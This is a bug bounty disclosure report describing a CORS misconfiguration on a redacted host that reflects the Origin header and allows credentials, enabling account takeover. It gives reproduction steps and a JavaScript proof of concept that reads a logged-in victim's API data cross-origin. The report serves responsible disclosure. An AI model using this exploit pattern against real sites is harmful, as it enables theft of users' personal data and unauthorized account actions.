Account takeover via CORS


Hi,


## Summary

The following host suffer to a CORS (Cross Origin Resource Sharing) misconfiguration.

xxx.xxxxxxxxxxx.xxx


## Description

Since the header `Access-Control-Allow-Credentials` is set to `true` and since the header `Access-Control-Allow-Origin` in the HTTP response reflects the header `Origin` in the HTTP request, it's possible for a malicious page to trick it to allow this remote website to access customers datas and perform unauthorized actions.  
All actions available in the API to be exact like xxxxxxxxxxxxxxxxxxxxxx and so on, a full CRUD access to the account.


## Steps to Reproduce

1/ login your account here:
`https://xxx.xxxxxxxxxxxxxx.xxx`  
2/ add something in your cart, like a domain  
3/ Open a new tab in your browser and visit this url:
`http://poc.xxxxxxxxxxxx.xxx/poc/xxxxxxxxxxx.html`

Your personnal infos must be displayed. 


## PoC

{}

__Script__
```
<script type="text/javascript">
  function cors() {
  var xhttp = new XMLHttpRequest();

  xhttp.onreadystatechange = function() {
    //if (this.readyState == 4 && this.status == 200) {
    document.getElementById("demo").innerHTML = this.responseText;
    //}
  };

  xhttp.open("GET", "https://xxx.xxxxxxxxxxx.xxx/api/xxxxx", true);
  xhttp.withCredentials = true;
  xhttp.send();
}

cors();
</script>
```


## See also

https://www.owasp.org/index.php/CORS_OriginHeaderScrutiny  
http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html  
https://www.cynet.com/wp-content/uploads/2016/12/Blog-Post-BugSec-Cynet-Facebook-Originull.pdf  




Best regards,

Gwen

